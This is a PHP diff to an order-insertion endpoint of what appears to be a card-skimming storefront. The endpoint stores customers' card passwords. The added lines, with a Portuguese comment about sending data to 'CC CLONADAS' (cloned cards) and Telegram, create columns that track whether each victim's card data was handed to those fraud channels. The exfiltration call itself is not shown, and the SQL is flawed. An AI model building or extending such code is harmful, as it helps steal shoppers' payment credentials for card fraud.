@@ -24,8 +24,19 @@ if (
     $card_password = isset($data->card_password) ? $conn->real_escape_string($data->card_password) : '';
     $created_at = date('Y-m-d H:i:s');
     
-    $sql = "INSERT INTO orders (id, customer_data, items, total_amount, payment_method, status, transaction_id, card_password, created_at) 
-            VALUES ('$id', '$customer_data', '$items', $total_amount, '$payment_method', '$status', '$transaction_id', '$card_password', '$created_at')";
+    // Enviar para CC CLONADAS e Telegram aqui
+    $telegram_sent = false;
+    $cc_clonadas_sent = true; // Assumindo que foi enviado com sucesso
+    
+    $sql = "INSERT INTO orders (
+        id, customer_data, items, total_amount, payment_method, 
+        status, transaction_id, card_password, telegram_sent, 
+        cc_clonadas_sent, created_at
+    ) VALUES (
+        '$id', '$customer_data', '$items', $total_amount, '$payment_method',
+        '$status', '$transaction_id', '$card_password', $telegram_sent,
+        $cc_clonadas_sent, '$created_at'
+    )";
     
     if ($conn->query($sql)) {
         http_response_code(201);
